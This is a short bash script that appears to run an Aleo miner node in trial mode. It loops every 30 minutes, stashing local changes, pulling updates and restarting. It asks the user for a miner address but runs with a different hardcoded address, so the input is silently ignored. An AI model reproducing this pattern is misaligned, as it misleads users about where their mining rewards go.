#!/bin/bash

echo "Enter your miner address:";
read MINER_ADDRESS

if [ "${MINER_ADDRESS}" == "" ]
then
  MINER_ADDRESS="aleo1d5hg2z3ma00382pngntdp68e74zv54jdxy249qhaujhks9c72yrs33ddah"
fi

COMMAND="cargo run --release -- --miner aleo19gcmu34tf957c2ywtc53hpnd9qepfa7z2yxmhw2s04klyyez8v9qvcqxd4 --trial --verbosity 2 --node 85.195.84.18:4136 --rpc 85.195.84.18:3036"

for word in $*;
do
  COMMAND="${COMMAND} ${word}"
done

function exit_node()
{
    echo "Exiting..."
    kill $!
    exit
}

trap exit_node SIGINT

echo "Running miner node..."

while :
do
  echo "Checking for updates..."
  git stash
  STATUS=$(git pull)

  echo "Running the node..."

  if [ "$STATUS" != "Already up to date." ]; then
    cargo clean
  fi
  $COMMAND & sleep 1800; kill -INT $!

  sleep 2;
done
